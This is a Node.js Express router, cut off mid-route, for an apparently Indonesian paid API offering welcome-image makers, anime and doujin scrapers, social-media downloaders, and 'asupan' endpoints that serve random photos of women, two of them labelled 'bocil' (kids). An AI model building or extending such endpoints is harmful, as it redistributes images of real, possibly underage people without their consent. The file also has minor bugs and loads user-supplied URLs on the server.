__path = process.cwd();

require('../settings.js')
var express = require('express');
var axios = require('axios');
var randUserAgent = require('rand-user-agent')
var {
    parsePhoneNumber
} = require('awesome-phonenumber');
var util = require('util');
var qs = require('qs');
var fetch = require('node-fetch');
var cheerio = require('cheerio');
var request = require('request');
var fs = require('fs');
var router = express.Router();
var creator = global.creator
const listkey = global.apikey

const {
    Configuration,
    OpenAIApi,
    openai
} = require("openai");
const zero = require("../lib/text")
const scr = require('@bochilteam/scraper');
const { h5tuqq } = require('@xct007/frieren-scraper');
const api = require('caliph-api')
const isImageURL = require('image-url-validator').default
const { shortText } = require("limit-text-js")
const Frieren = require("@xct007/frieren-scraper");
const Canvas = require('canvas')
const {
    color,
    bgcolor
} = require(__path + '/lib/color.js');
const {
    fetchJson
} = require(__path + '/lib/fetcher.js')
const options = require(__path + '/lib/options.js');
const {
    getBuffer
} = require(__path + '/lib/functions.js');
const oxy = require(__path + '/lib/oxy.js');

var {
    Vokal,
    Base,
    Searchnabi,
    Gempa
} = require('./../lib');

var {
    fbDownloader,
    fbdown2
} = require('./../lib/utils/fbdl');

_ = require('lodash')


loghandler = {
    noapikey: {
        status: 403,
        message: '[!] Masukkan parameter apikey anda, jika tidak ada hubungi WhatsApp saya untuk membeli baru',
        maintanied_by: `${creator}`
    },
    error: {
        status: 503,
        message: '[!] Service Unavaible, Sedang dalam perbaikan',
        maintanied_by: `${creator}`
    },
    apikey: {
        status: 403,
        message: '[!] Forbiden, Invalid apikey, hubungi WhatsApp saya jika tidak mempunyai apikey',
        maintanied_by: `${creator}`
    },
    noturl: {
        status: 403,
        message: '[!] Forbiden, Invlid url, masukkan parameter url',
        maintanied_by: `${creator}`,
    }
}

var len = 15
var arr = '123456789abcdefghijklmnopqrstuvwxyz'
var random = '';

for (var i = len; i > 0; i--) {
    random += arr[Math.floor(Math.random() * arr.length)];
}

var lenn = 5
var randomlagi = '';

for (var i = lenn; i > 0; i--) {
    randomlagi += arr[Math.floor(Math.random() * arr.length)];
}

var randomTextNumber = random + randomlagi + '---------Apriliya-Putri-Fatmawati' + 'LOLI--KILLERS';

router.get('/cekapikey', async (req, res, next) => {
    var apikey = req.query.apikey
    if (!apikey) return res.json(loghandler.noapikey)
    if (listkey.includes(apikey)) {
        res.json({
            apikey: apikey,
            status: true,
            limit: 'unlimited'
        })
    } else {
        res.json(loghandler.apikey)
    }
})
//―――――――――――――――――――――――――――――――――――――――――― ┏  Canvas  ┓ ―――――――――――――――――――――――――――――――――――――――――― \\
router.get('/maker/welcome', async (req, res, next) => {
	var name = req.query.name
    var grup = req.query.gpname
    var member = req.query.member
	var pp = req.query.pp
    var bg = req.query.bg
	
	var imgpp = await isImageURL(pp)
	var bgimg = await isImageURL(bg)

    if (!name ) return res.json({ status : false, creator : 'Zeltoria', message : "Masukan Namanya"})  
	if (!grup ) return res.json({ status : false, creator : 'Zeltoria', message : "Masukan Nama Grup"})  
    if (!member ) return res.json({ status : false, creator : 'Zeltoria', message : "Masukan Param  Member"})  
	if (!pp ) return res.json({ status : false, creator : 'Zeltoria', message : "Masukan Param  PP"})  
    if (!bg ) return res.json({ status : false, creator : 'Zeltoria', message : "Masukan Param  Bg"})  

	if ( !imgpp ) return res.json({ status : false, creator : 'Zeltoria', message : "cek kembali url image pp"}) 
	if ( !bgimg ) return res.json({ status : false, creator : 'Zeltoria', message : "cek kembali url image bg"}) 
   
    Canvas.registerFont('./lib/Creme.ttf', { family: 'creme' })

var welcomeCanvas = {}
welcomeCanvas.create = Canvas.createCanvas(1024, 500)
welcomeCanvas.context = welcomeCanvas.create.getContext('2d')
welcomeCanvas.context.font = '72px creme'
welcomeCanvas.context.fillStyle = '#ffffff'

await Canvas.loadImage("./lib/wbg1.jpg").then(async (img) => {
    welcomeCanvas.context.drawImage(img, 0, 0, 1024, 500)

})

let can = welcomeCanvas

await Canvas.loadImage(bg)
.then(bg => {
can.context.drawImage(bg, 320, 0, 709, 360)
})

    let canvas = welcomeCanvas
    canvas.context.beginPath()
    canvas.context.arc(174, 279, 115, 0, Math.PI * 2, true)
    canvas.context.stroke()
    canvas.context.fill()
    canvas.context.font = '100px creme',
    canvas.context.textAlign = 'center'
    canvas.context.fillText("Welcome", 670, 140)
    canvas.context.font = '100px Helvetica'
    canvas.context.fillText("____   ____", 670, 160)
    canvas.context.fillText("✩", 670, 215)
    canvas.context.font = '100px creme'
    canvas.context.fillText(shortText(grup, 17), 670, 300)
    canvas.context.font = '40px creme'
    canvas.context.textAlign = 'start'
    canvas.context.fillText(shortText(name, 40), 420, 420)
    canvas.context.font = '35px creme'
    canvas.context.fillText(`${shortText(member, 10)} th member`, 430, 490)
    canvas.context.beginPath()
    canvas.context.arc(174, 279, 110, 0, Math.PI * 2, true)
    canvas.context.closePath()
    canvas.context.clip()
    await Canvas.loadImage(pp)
    .then(pp => {
        canvas.context.drawImage(pp, 1, 150, 300, 300)
    })
    res.set({'Content-Type': 'image/png'})
    res.send(canvas.create.toBuffer())
})
router.get('/maker/goodbye', async (req, res, next) => {
	var name = req.query.name
    var grup = req.query.gpname
	var pp = req.query.pp
    var member = req.query.member
    var bg = req.query.bg

	var imgpp = await isImageURL(pp)
	var bgimg = await isImageURL(bg)

    if (!name ) return res.json({ status : false, creator : 'Zeltoria', message : "Masukan Param  Nama"})  
	if (!grup ) return res.json({ status : false, creator : 'Zeltoria', message : "Masukan Param  Nama Grup"})  
    if (!member ) return res.json({ status : false, creator : 'Zeltoria', message : "Masukan Param  Member"})  
    if (!bg ) return res.json({ status : false, creator : 'Zeltoria', message : "Masukan Param  Bg"})  
	if (!pp) return res.json({ status : false, creator : 'Zeltoria', message : "Masukan Param  PP"})
	if ( !imgpp ) return res.json({ status : false, creator : 'Zeltoria', message : "Masukan Param  Link PP Yg Bener"}) 
	if ( !bgimg ) return res.json({ status : false, creator : 'Zeltoria', message : "Masukan Param  Link BG Yg Bener"}) 

    Canvas.registerFont('./lib/Creme.ttf', { family: 'creme' })

var goobyeCanvas = {}
goobyeCanvas.create = Canvas.createCanvas(1024, 500)
goobyeCanvas.context =  goobyeCanvas.create.getContext('2d')
goobyeCanvas.context.font = '72px creme'
goobyeCanvas.context.fillStyle = '#ffffff'

await Canvas.loadImage("./lib/wbg1.jpg").then(async (img) => {
	goobyeCanvas.context.drawImage(img, 0, 0, 1024, 500)

})

let can =  goobyeCanvas

await Canvas.loadImage(bg)
.then(bg => {
can.context.drawImage(bg, 320, 0, 709, 360)
})

    let canvas = goobyeCanvas
    canvas.context.beginPath()
    canvas.context.arc(174, 279, 115, 0, Math.PI * 2, true)
    canvas.context.stroke()
    canvas.context.fill()
    canvas.context.font = '100px creme',
    canvas.context.textAlign = 'center'
    canvas.context.fillText("GoodBye", 670, 140)
    canvas.context.font = '100px Helvetica'
    canvas.context.fillText("____   ____", 670, 160)
    canvas.context.fillText("✩", 670, 215)
    canvas.context.font = '100px creme'
    canvas.context.fillText(shortText(grup, 17), 670, 300)
    canvas.context.font = '40px creme'
    canvas.context.textAlign = 'start'
    canvas.context.fillText(shortText(name, 40), 420, 420)
    canvas.context.font = '35px creme'
    canvas.context.fillText(`${shortText(member, 10)} th member`, 430, 490)
    canvas.context.beginPath()
    canvas.context.arc(174, 279, 110, 0, Math.PI * 2, true)
    canvas.context.closePath()
    canvas.context.clip()
    await Canvas.loadImage(pp)
    .then(pp => {
        canvas.context.drawImage(pp, 1, 150, 300, 300)
    })
    res.set({'Content-Type': 'image/png'})
    res.send(canvas.create.toBuffer())
})

router.get('/maker/ttp', async (req, res) => {
	var text = req.query.text
	if (!text ) return res.json({ status : false, creator : `${creator}`, message : "Textnya Mana?"})

	Canvas.registerFont('./lib/SF-Pro.ttf', { family: 'SF-Pro' })
	let length = text.length
		
	var font = 90
	if (length>12){ font = 68}
	if (length>15){ font = 58}
	if (length>18){ font = 55}
	if (length>19){ font = 50}
	if (length>22){ font = 48}
	if (length>24){ font = 38}
	if (length>27){ font = 35}
	if (length>30){ font = 30}
	if (length>35){ font = 26}
	if (length>39){ font = 25}
	if (length>40){ font = 20}
	if (length>49){ font = 10}

	var ttp = {}
	ttp.create = Canvas.createCanvas(576, 576)
	ttp.context = ttp.create.getContext('2d')
	ttp.context.font =`${font}px SF-Pro`
	ttp.context.strokeStyle = 'black'
	ttp.context.lineWidth = 3
	ttp.context.textAlign = 'center'
	ttp.context.strokeText(text, 290,300)
	ttp.context.fillStyle = 'black'
	ttp.context.fillText(text, 290,300)
		res.set({'Content-Type': 'image/png'})
		res.send(ttp.create.toBuffer())
  
})
//―――――――――――――――――――――――――――――――――――――――――― ┏  Anime  ┓ ―――――――――――――――――――――――――――――――――――――――――― \\
router.get("/anime/otakudesu/:path", (req, res) => {
	const otakudesuPath = [
		"search",
		"latest",
		"detail"
	]
	const {
		path
	} = req.params;
	if (!otakudesuPath.includes(path)) {
		return res.status(404).json({
			status: false,
			creator: `Zeltoria`,
			message: "Endpoint not found"
		})
	}
	const {
		url,
		query,
		apikey
	} = req.query
	if (!apikey) {
		return res.json(loghandler.noapikey);
	}
	if (!listkey.includes(apikey)) {
		return res.json(loghandler.apikey);
	}
	if (path === "search") {
		if (!query) {
			return res.json({
				status: false,
				creator: `Zeltoria`,
				message: "Query Nya Mana Vangsat?",
			});
		}
		Frieren.otakudesu.search(query).then((data) => {
			if (data.error) {
				/** Schema
				{
					"error": true,
					"message": "String"
				}
				 */
				return res.json({
					status: false,
					creator: `Zeltoria`,
					...data
				})
			}
			return res.json({
				status: true,
				creator: `Zeltoria`,
				result: data
			})
		})
	}
	if (path === "latest") {
		Frieren.otakudesu.latest().then((data) => {
			if (data.error) {
				return res.json({
					status: false,
					creator: `Zeltoria`,
					...data
				})
			}
			return res.json({
				status: true,
				creator: `Zeltoria`,
				result: data
			})
		})
	}
	if (path === "detail") {
		if (!url) {
			return res.json({
				status: false,
				creator: `Zeltoria`,
				message: "Linknya Mana Anying?",
			});
		}
		Frieren.otakudesu.detail(url).then((data) => {
			if (data.error) {
				return res.json({
					status: false,
					creator: `Zeltoria`,
					...data
				})
			}
			return res.json({
				status: true,
				creator: `Zeltoria`,
				...data
			})
		})
	}
})
router.get("/anime/komiku/:path", (req, res) => {
	const komikuId = [
		"search",
		"latest",
		"detail"
	]
	const {
		path
	} = req.params;
	if (!komikuId.includes(path)) {
		return res.status(404).json({
			status: false,
			creator: `Zeltoria`,
			message: "Endpoint not found"
		})
	}
	const {
		url,
		query,
		apikey
	} = req.query
	if (!apikey) {
		return res.json(loghandler.noapikey);
	}
	if (!listkey.includes(apikey)) {
		return res.json(loghandler.apikey);
	}
	if (path === "search") {
		if (!query) {
			return res.json({
				status: false,
				creator: `Zeltoria`,
				message: "Query Nya Mana Vangsat?",
			});
		}
		Frieren.komikuId.search(query).then((data) => {
			if (data.error) {
				/** Schema
				{
					"error": true,
					"message": "String"
				}
				 */
				return res.json({
					status: false,
					creator: `Zeltoria`,
					...data
				})
			}
			return res.json({
				status: true,
				creator: `Zeltoria`,
				result: data
			})
		})
	}
	if (path === "latest") {
		Frieren.komikuId.latest().then((data) => {
			if (data.error) {
				return res.json({
					status: false,
					creator: `Zeltoria`,
					...data
				})
			}
			return res.json({
				status: true,
				creator: `Zeltoria`,
				result: data
			})
		})
	}
	if (path === "detail") {
		if (!url) {
			return res.json({
				status: false,
				creator: `Zeltoria`,
				message: "Linknya Mana Anying?",
			});
		}
		Frieren.komikuId.detail(url).then((data) => {
			if (data.error) {
				return res.json({
					status: false,
					creator: `Zeltoria`,
					...data
				})
			}
			return res.json({
				status: true,
				creator: `Zeltoria`,
				...data
			})
		})
	}
})
router.get("/anime/doujindesu/:path", (req, res) => {
	const doujindesu = [
		"search",
		"latest",
		"detail"
	]
	const {
		path
	} = req.params;
	if (!doujindesu.includes(path)) {
		return res.status(404).json({
			status: false,
			creator: `Zeltoria`,
			message: "Endpoint not found"
		})
	}
	const {
		url,
		query,
		apikey
	} = req.query
	if (!apikey) {
		return res.json(loghandler.noapikey);
	}
	if (!listkey.includes(apikey)) {
		return res.json(loghandler.apikey);
	}
	if (path === "search") {
		if (!query) {
			return res.json({
				status: false,
				creator: `Zeltoria`,
				message: "Query Nya Mana Vangsat?",
			});
		}
		Frieren.doujindesu.search(query).then((data) => {
			if (data.error) {
				/** Schema
				{
					"error": true,
					"message": "String"
				}
				 */
				return res.json({
					status: false,
					creator: `Zeltoria`,
					...data
				})
			}
			return res.json({
				status: true,
				creator: `Zeltoria`,
				result: data
			})
		})
	}
	if (path === "latest") {
		Frieren.doujindesu.latest().then((data) => {
			if (data.error) {
				return res.json({
					status: false,
					creator: `Zeltoria`,
					...data
				})
			}
			return res.json({
				status: true,
				creator: `Zeltoria`,
				result: data
			})
		})
	}
	if (path === "detail") {
		if (!url) {
			return res.json({
				status: false,
				creator: `Zeltoria`,
				message: "Linknya Mana Anying?",
			});
		}
		Frieren.doujindesu.detail(url).then((data) => {
			if (data.error) {
				return res.json({
					status: false,
					creator: `Zeltoria`,
					...data
				})
			}
			return res.json({
				status: true,
				creator: `Zeltoria`,
				...data
			})
		})
	}
})

//―――――――――――――――――――――――――――――――――――――――――― ┏  Asupan  ┓ ―――――――――――――――――――――――――――――――――――――――――― \\
router.get('/asupan/randomasupan', async (req, res, next) => {
    var apikey = req.query.apikey
    var text = req.query.page
    if (!apikey) return res.json(loghandler.noapikey)
    if (listkey.includes(apikey)) {
        const Asupan = JSON.parse(fs.readFileSync(__path + '/database/asupantiktok.json'));
        const randAsupan = Asupan[Math.floor(Math.random() * Asupan.length)];
        data = await fetch(randAsupan).then(v => v.buffer())
        //data = await getBuffer(`https://api.lolhuman.xyz/api/asupan?apikey=${lolkey}`)
        await fs.writeFileSync(__path + '/tmp/asupan.mp4', data)
        res.sendFile(__path + '/tmp/asupan.mp4')
    } else {
        res.json(loghandler.apikey)
    }
});
router.get('/asupan/bocil1', async (req, res, next) => {
    var apikey = req.query.apikey
    var text = req.query.page
    if (!apikey) return res.json(loghandler.noapikey)
    if (listkey.includes(apikey)) {
        const bocil = JSON.parse(fs.readFileSync(__path + '/database/bocil.json'));
        const ranv = bocil[Math.floor(Math.random() * bocil.length)];
        data = await fetch(ranv).then(v => v.buffer())
        await fs.writeFileSync(__path + '/tmp/bocil.jpeg', data)
        res.sendFile(__path + '/tmp/bocil1.jpeg')
    } else {
        res.json(loghandler.apikey)
    }
})
router.get('/asupan/rikagusriani', async (req, res, next) => {
          var apikey = req.query.apikey
       	if (!apikey) return res.json(loghandler.noapikey);
        if(listkey.includes(apikey)){
       fetch(encodeURI(`https://raw.githubusercontent.com/binjaicity/warga62/master/asupan/rikagusriani.json`))
        .then(response => response.json())
        .then(async data => {
        var result = data[Math.floor(Math.random() * data.length)];
        var buffer = result.url;
          data = await fetch(buffer).then(v => v.buffer())
         await fs.writeFileSync(__path +'/tmp/chika.mp4', data)
        res.sendFile(__path+'/tmp/chika.mp4')
         })
} else {
  res.json(loghandler.apikey);
}
})
router.get('/asupan/santuy', async (req, res, next) => {
          var apikey = req.query.apikey
       	if (!apikey) return res.json(loghandler.noapikey);
        if(listkey.includes(apikey)){
       fetch(encodeURI(`https://raw.githubusercontent.com/binjaicity/warga62/master/santuy.json`))
        .then(response => response.json())
        .then(async data => {
        var result = data[Math.floor(Math.random() * data.length)];
        var buffer = result.url;
          data = await fetch(buffer).then(v => v.buffer())
         await fs.writeFileSync(__path +'/tmp/chika.mp4', data)
        res.sendFile(__path+'/tmp/chika.mp4')
         })
} else {
  res.json(loghandler.apikey);
}
})
router.get('/asupan/ukhty', async (req, res, next) => {
          var apikey = req.query.apikey
       	if (!apikey) return res.json(loghandler.noapikey);
        if(listkey.includes(apikey)){
       fetch(encodeURI(`https://raw.githubusercontent.com/binjaicity/warga62/master/ukhty.json`))
        .then(response => response.json())
        .then(async data => {
        var result = data[Math.floor(Math.random() * data.length)];
        var buffer = result.url;
          data = await fetch(buffer).then(v => v.buffer())
         await fs.writeFileSync(__path +'/tmp/chika.mp4', data)
        res.sendFile(__path+'/tmp/chika.mp4')
         })
} else {
  res.json(loghandler.apikey);
}
})
router.get('/asupan/bocil', async (req, res, next) => {
          var apikey = req.query.apikey
       	if (!apikey) return res.json(loghandler.noapikey);
        if(listkey.includes(apikey)){
       fetch(encodeURI(`https://raw.githubusercontent.com/binjaicity/warga62/master/bocil.json`))
        .then(response => response.json())
        .then(async data => {
        var result = data[Math.floor(Math.random() * data.length)];
        var buffer = result.url;
          data = await fetch(buffer).then(v => v.buffer())
         await fs.writeFileSync(__path +'/tmp/chika.mp4', data)
        res.sendFile(__path+'/tmp/chika.mp4')
         })
} else {
  res.json(loghandler.apikey);
}
})
router.get('/asupan/gheayubi', async (req, res, next) => {
          var apikey = req.query.apikey
       	if (!apikey) return res.json(loghandler.noapikey);
        if(listkey.includes(apikey)){
       fetch(encodeURI(`https://raw.githubusercontent.com/binjaicity/warga62/master/geayubi.json`))
        .then(response => response.json())
        .then(async data => {
        var result = data[Math.floor(Math.random() * data.length)];
        var buffer = result.url;
          data = await fetch(buffer).then(v => v.buffer())
         await fs.writeFileSync(__path +'/tmp/chika.mp4', data)
        res.sendFile(__path+'/tmp/chika.mp4')
         })
} else {
  res.json(loghandler.apikey);
}
})
router.get('/asupan/china', async (req, res, next) => {
    var apikey = req.query.apikey
    var text = req.query.page
    if (!apikey) return res.json(loghandler.noapikey)
    if (listkey.includes(apikey)) {
        fetch(encodeURI(`https://github.com/zeroonecraft/data-gabut/raw/main/cecan/china.json`))
            .then(response => response.json())
            .then(data => {
                var result = data;
                var result = data[Math.floor(Math.random() * data.length)];
                var requestSettings = {
                    url: result.url,
                    method: 'GET',
                    encoding: null
                };
                request(requestSettings, function(error, response, body) {
                    res.set('Content-Type', 'image/jpg');
                    res.send(body);
                });
            })
    } else {
        res.json(loghandler.apikey)
    }
})
router.get('/asupan/vietnam', async (req, res, next) => {
    var apikey = req.query.apikey
    var text = req.query.page
    if (!apikey) return res.json(loghandler.noapikey)
    if (listkey.includes(apikey)) {
        fetch(encodeURI(`https://github.com/zeroonecraft/data-gabut/raw/main/cecan/vietnam.json`))
            .then(response => response.json())
            .then(data => {
                var result = data;
                var result = data[Math.floor(Math.random() * data.length)];
                var requestSettings = {
                    url: result.url,
                    method: 'GET',
                    encoding: null
                };
                request(requestSettings, function(error, response, body) {
                    res.set('Content-Type', 'image/jpg');
                    res.send(body);
                });
            })
    } else {
        res.json(loghandler.apikey)
    }
})
router.get('/asupan/thailand', async (req, res, next) => {
    var apikey = req.query.apikey
    var text = req.query.page
    if (!apikey) return res.json(loghandler.noapikey)
    if (listkey.includes(apikey)) {
        fetch(encodeURI(`https://github.com/zeroonecraft/data-gabut/raw/main/cecan/thailand.json`))
            .then(response => response.json())
            .then(data => {
                var result = data;
                var result = data[Math.floor(Math.random() * data.length)];
                var requestSettings = {
                    url: result.url,
                    method: 'GET',
                    encoding: null
                };
                request(requestSettings, function(error, response, body) {
                    res.set('Content-Type', 'image/jpg');
                    res.send(body);
                });
            })
    } else {
        res.json(loghandler.apikey)
    }
})
router.get('/asupan/indonesia', async (req, res, next) => {
    var apikey = req.query.apikey
    if (!apikey) return res.json(loghandler.noapikey)
    if (listkey.includes(apikey)) {
        var data = ["https://i.postimg.cc/sgYy39Yy/1.jpg", "https://i.postimg.cc/k5wmbJYp/10.jpg", "https://i.postimg.cc/XJJ0KRT7/11.jpg", "https://i.postimg.cc/PfCCT9Pj/12.jpg", "https://i.postimg.cc/GpbRt8KD/13.jpg", "https://i.postimg.cc/gkRr6hVt/14.jpg", "https://i.postimg.cc/rsRX3SVB/15.jpg", "https://i.postimg.cc/52S0sMkw/16.jpg", "https://i.postimg.cc/tTY4RnR5/17.jpg", "https://i.postimg.cc/4d7XRCw2/18.jpg", "https://i.postimg.cc/k55nwRSm/19.jpg", "https://i.postimg.cc/QCcsVp2p/2.jpg", "https://i.postimg.cc/zGz5XH0g/20.jpg", "https://i.postimg.cc/y8LKJ6br/21.jpg", "https://i.postimg.cc/WbjcXJRH/22.jpg", "https://i.postimg.cc/m2wfq2B2/23.jpg", "https://i.postimg.cc/MGghRnbt/24.jpg", "https://i.postimg.cc/1t6bKyvS/25.jpg", "https://i.postimg.cc/fyNp21P9/26.jpg", "https://i.postimg.cc/J05g9Pwd/27.jpg", "https://i.postimg.cc/m2TKQfCx/28.jpg", "https://i.postimg.cc/MKtN5Pmn/29.jpg", "https://i.postimg.cc/PxGRJBTR/3.jpg", "https://i.postimg.cc/cHQ5nXJ4/30.jpg", "https://i.postimg.cc/bY9BYCMm/31.jpg", "https://i.postimg.cc/QdH4bXMz/32.jpg", "https://i.postimg.cc/Rhgd78x9/33.jpg", "https://i.postimg.cc/sD2wjV52/34.jpg", "https://i.postimg.cc/pXV1mQMR/35.jpg", "https://i.postimg.cc/sfmTCBQ8/36.jpg", "https://i.postimg.cc/ZRcxmgR3/37.jpg", "https://i.postimg.cc/mkgNgwzn/38.jpg", "https://i.postimg.cc/pXyJNsth/4.jpg", "https://i.postimg.cc/13q0X4Xy/5.jpg", "https://i.postimg.cc/DZBLHXjP/7.jpg", "https://i.postimg.cc/RhYfVzz3/8.jpg", "https://i.postimg.cc/TYZmzG9F/9.jpg"]
        var result = data[Math.floor(Math.random() * data.length)];
        var requestSettings = {
            url: result,
            method: 'GET',
            encoding: null
        };
        request(requestSettings, function(error, response, body) {
            res.set('Content-Type', 'image/jpg');
            res.send(body);
        });
    } else {
        res.json(loghandler.apikey)
    }
})
router.get('/asupan/korea', async (req, res, next) => {
    var apikey = req.query.apikey
    if (!apikey) return res.json(loghandler.noapikey)
    if (listkey.includes(apikey)) {
        var data = ["https://i.postimg.cc/K87Z4CkB/p-19620motq1.jpg", "https://i.postimg.cc/wvgR7hjT/p-19623vybj1.jpg", "https://i.postimg.cc/QtJ5bfyT/p-19623z95r1.jpg", "https://i.postimg.cc/XJbddRQW/p-19624y1on1.jpg", "https://i.postimg.cc/dVG0rLX7/p-19625anrs1.jpg", "https://i.postimg.cc/9fWc91ZS/p-19625lzea1.jpg", "https://i.postimg.cc/SKWzSZqv/p-19626rftx1.jpg", "https://i.postimg.cc/hPjxLbbX/p-196298pkr1.jpg", "https://i.postimg.cc/hvGJ0cmk/p-1962alh5c1.jpg", "https://i.postimg.cc/ZqcKsXJ4/p-1962asjl31.jpg", "https://i.postimg.cc/pX6jqhqq/p-1962enqpe1.jpg", "https://i.postimg.cc/T1SPqmfb/p-1962gl6nf1.jpg", "https://i.postimg.cc/mZVC16Mx/p-1962koqm41.jpg", "https://i.postimg.cc/d3zqTYjm/p-1962pvq221.jpg", "https://i.postimg.cc/3xQ883R3/p-1962spcdo1.jpg", "https://i.postimg.cc/BbZFw2rw/p-1962u3qhb1.jpg", "https://i.postimg.cc/nVwMJ8BL/p-1962umwai1.jpg", "https://i.postimg.cc/76hDs6Bn/p-1962y8lij1.jpg", "https://i.postimg.cc/ydp6s9JG/p-1962yt9ph1.jpg"]
        var result = data[Math.floor(Math.random() * data.length)];
        var requestSettings = {
            url: result,
            method: 'GET',
            encoding: null
        };
        request(requestSettings, function(error, response, body) {
            res.set('Content-Type', 'image/jpg');
            res.send(body);
        });
    } else {
        res.json(loghandler.apikey)
    }
})
router.get('/asupan/japan', async (req, res, next) => {
    var apikey = req.query.apikey
    if (!apikey) return res.json(loghandler.noapikey)
    if (listkey.includes(apikey)) {
        var data = ["https://i.postimg.cc/RCcjLvF6/p-196252lk91.jpg", "https://i.postimg.cc/7hMdHncM/p-19625eppj1.jpg", "https://i.postimg.cc/CLpwwvZD/p-19629cg431.jpg", "https://i.postimg.cc/pVwLpWSm/p-19629eev81.jpg", "https://i.postimg.cc/ydxwTRD7/p-1962cau3w1.jpg", "https://i.postimg.cc/D0LFqGN8/p-1962ck87p1.jpg", "https://i.postimg.cc/76zjcknR/p-1962fyik51.jpg", "https://i.postimg.cc/bYtzcXvp/p-1962i85aq1.jpg", "https://i.postimg.cc/nLWtgTbX/p-1962nvj4g1.jpg", "https://i.postimg.cc/rFGMsSWH/p-1962o5sp41.jpg", "https://i.postimg.cc/wTgnWnyW/p-1962p9nlk1.jpg", "https://i.postimg.cc/T1XBv4k3/p-1962q7ura1.jpg", "https://i.postimg.cc/nz6pj20y/p-1962qiubc1.jpg", "https://i.postimg.cc/13CxVMzv/p-1962tt38s1.jpg", "https://i.postimg.cc/ZYBqbBwk/p-1962ufc7p1.jpg", "https://i.postimg.cc/52x1C6S2/p-1962vn5rc1.jpg", "https://i.postimg.cc/GpHWFY8d/p-1962vpyp71.jpg", "https://i.postimg.cc/tTc8vg6W/p-1962w2hyp1.jpg"]
        var result = data[Math.floor(Math.random() * data.length)];
        var requestSettings = {
            url: result,
            method: 'GET',
            encoding: null
        };
        request(requestSettings, function(error, response, body) {
            res.set('Content-Type', 'image/jpg');
            res.send(body);
        });
    } else {
        res.json(loghandler.apikey)
    }
})
router.get('/asupan/malaysia', async (req, res, next) => {
    var apikey = req.query.apikey
    if (!apikey) return res.json(loghandler.noapikey)
    if (listkey.includes(apikey)) {
        var data = ["https://i.postimg.cc/L8BFTfV1/p-1962mt0wq1.jpg", "https://i.postimg.cc/SKgF0h3Q/p-1962p3bmk1.jpg", "https://i.postimg.cc/25tYbYwc/p-1962pac7k1.jpg", "https://i.postimg.cc/fRXRhJfz/p-1962qpsvb1.jpg", "https://i.postimg.cc/Yq7Hmb6H/p-1962rcc7k1.jpg", "https://i.postimg.cc/G3QDZSh7/p-1962v04461.jpg", "https://i.postimg.cc/6QttJzQc/p-1962va89q1.jpg", "https://i.postimg.cc/t4HHWDFb/p-1962y8nl71.jpg", "https://i.postimg.cc/02VB2fZZ/p-1962y8oif1.jpg", "https://i.postimg.cc/CMqh8R9j/p-1962yyuuh1.jpg", "https://i.postimg.cc/Hn7f77xj/p-19622gld51.jpg", "https://i.postimg.cc/Hnpyrb39/p-196240q3o1.jpg", "https://i.postimg.cc/wMGj9Nrv/p-19624pvv61.jpg", "https://i.postimg.cc/hPXGpCJ7/p-19625n89w1.jpg", "https://i.postimg.cc/TwQPHFqn/p-19627bm3c1.jpg", "https://i.postimg.cc/zG08NKR1/p-1962c7n2o1.jpg", "https://i.postimg.cc/j2XkfQTx/p-1962caiz61.jpg", "https://i.postimg.cc/59TJNf06/p-1962csdwa1.jpg", "https://i.postimg.cc/6pwptBjC/p-1962d0xml1.jpg", "https://i.postimg.cc/PqyhtZpj/p-1962d4cuh1.jpg", "https://i.postimg.cc/DZYTGTPp/p-1962grit21.jpg", "https://i.postimg.cc/T1LXq4kd/p-1962zgkj21.jpg"]
        var result = data[Math.floor(Math.random() * data.length)];
        var requestSettings = {
            url: result,
            method: 'GET',
            encoding: null
        };
        request(requestSettings, function(error, response, body) {
            res.set('Content-Type', 'image/jpg');
            res.send(body);
        });
    } else {
        res.json(loghandler.apikey)
    }
})
router.get('/asupan/random', async (req, res, next) => {
    var apikey = req.query.apikey
    var text = req.query.page
    if (!apikey) return res.json(loghandler.noapikey)
    if (listkey.includes(apikey)) {
        fetch(encodeURI(`https://github.com/zeroonecraft/data-gabut/raw/main/cecan/random.json`))
            .then(response => response.json())
            .then(data => {
                var result = data;
                var result = data[Math.floor(Math.random() * data.length)];
                var requestSettings = {
                    url: result.url,
                    method: 'GET',
                    encoding: null
                };
                request(requestSettings, function(error, response, body) {
                    res.set('Content-Type', 'image/jpg');
                    res.send(body);
                });
            })
    } else {
        res.json(loghandler.apikey)
    }
})

//―――――――――――――――――――――――――――――――――――――――――― ┏  Downloader  ┓ ―――――――――――――――――――――――――――――――――――――――――― \\
router.get("/download/mediafire", (req, res, next) => {
	var apikey = req.query.apikey;
	var url = req.query.url;
	if (!apikey) return res.json(loghandler.noapikey);
	if (!url)
		return res.json({
			status: false,
			creator: `Zeltoria`,
			message: "Linknya Mana Anying?",
		});
	if (listkey.includes(apikey)) {
		api.downloader.mediafire(url).then((data) => {
			if (!data.status) {
				return res.json(loghandler.error);
			}
			res.json(data)
		});
	} else {
		res.json(loghandler.apikey);
	}
});
router.get("/download/soundcloud", async (req, res, next) => {
	var apikey = req.query.apikey;
	var url = req.query.url;
	if (!apikey) return res.json(loghandler.noapikey);
	if (!url)
		return res.json({
			status: false,
			creator: `Zeltoria`,
			message: "Linknya Mana Anying?",
		});
	if (listkey.includes(apikey)) {
		api.downloader.soundcloud(url).then((data) => {
			if (data.error) {
				return res.json(loghandler.error);
			}
			res.json(data)
		})
	} else {
		res.json(loghandler.apikey);
	}
});
router.get('/download/tiktok', async (req, res, next) => {
          var apikey = req.query.apikey
          var url = req.query.url
       	if(!apikey) return res.json(loghandler.noapikey)
       if (!url) return res.json({ status : false, creator : `${creator}`, message : "masukan parameter url"})
        if(listkey.includes(apikey)){
       let ttlu = await scr.tiktokdl(url).catch(async _ => await scr.tiktokdlv2(url))
		var result = ttlu;
		res.json({
      status: true,
      creator: 'creator',
			result
		})
         .catch(e => {
         	console.log(e);
         	res.json(loghandler.error)
})
} else {
  res.json(loghandler.apikey)
}
})
router.get("/download/facebook", async (req, res, next) => {
	var apikey = req.query.apikey;
	var url = req.query.url;
	if (!apikey) return res.json(loghandler.noapikey);
	if (!url)
		return res.json({
			status: false,
			creator: `Zeltoria`,
			message: "Linknya Mana Anying?",
		});
	if (listkey.includes(apikey)) {
		Frieren.facebook.v1(url).then((data) => {
			// error handling
			if (data.error) {
				return res.json(loghandler.error);
			}
			res.json({
        status: true,
        creator: 'Zeltoria',
        data
      })
		})
	} else {
		res.json(loghandler.apikey);
	}
});
router.get('/download/instagram', async (req, res, next) => {
    var apikey = req.query.apikey
    var url = req.query.url
    if (!apikey) return res.json(loghandler.noapikey)
    if (!url) return res.json({
        status: false,
        creator: `${creator}`,
        message: "[!] Masukan parameter URL"
    })
